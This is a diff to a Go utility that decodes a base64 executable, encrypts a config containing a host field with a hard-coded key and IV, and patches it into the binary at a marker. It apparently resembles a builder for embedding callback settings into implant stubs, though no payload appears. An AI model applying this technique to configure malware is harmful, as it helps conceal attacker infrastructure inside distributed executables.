@@ -10,14 +10,16 @@ import (
 	"fmt"
 	"log"
 	"os"
+	"strings"
 )
 
 const (
 	ConfigKey = "B4A7E9C2D5F8A1B3C6E9D2F5A8B1C4D7"
 	ConfigIV  = "A1B2C3D4E5F6A7B8"
-	Marker    = "CONF_DATA_START:" // 16 bytes
 	ConfigLen = 2048
 )
+
+var Marker = []byte{0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0xFE, 0xBA, 0xBE, 0x13, 0x37, 0x99, 0x99, 0x88, 0x88, 0x77, 0x77}
 
 type Config struct {
 	Host string `json:"host"`
@@ -60,7 +62,8 @@ func main() {
 	}
 
 	// Decode EXE
-	exeData, err := base64.StdEncoding.DecodeString(string(b64Data))
+	trimmedB64 := strings.TrimSpace(string(b64Data))
+	exeData, err := base64.StdEncoding.DecodeString(trimmedB64)
 	if err != nil {
 		log.Fatalf("Error decoding base64: %v", err)
 	}
@@ -87,8 +90,7 @@ func main() {
 	copy(patchBlock[len(Marker):], encrypted)
 
 	// Find Marker in EXE
-	markerBytes := []byte(Marker)
-	index := bytes.Index(exeData, markerBytes)
+	index := bytes.Index(exeData, Marker)
 	if index == -1 {
 		log.Fatalf("Marker not found in EXE")
 	}
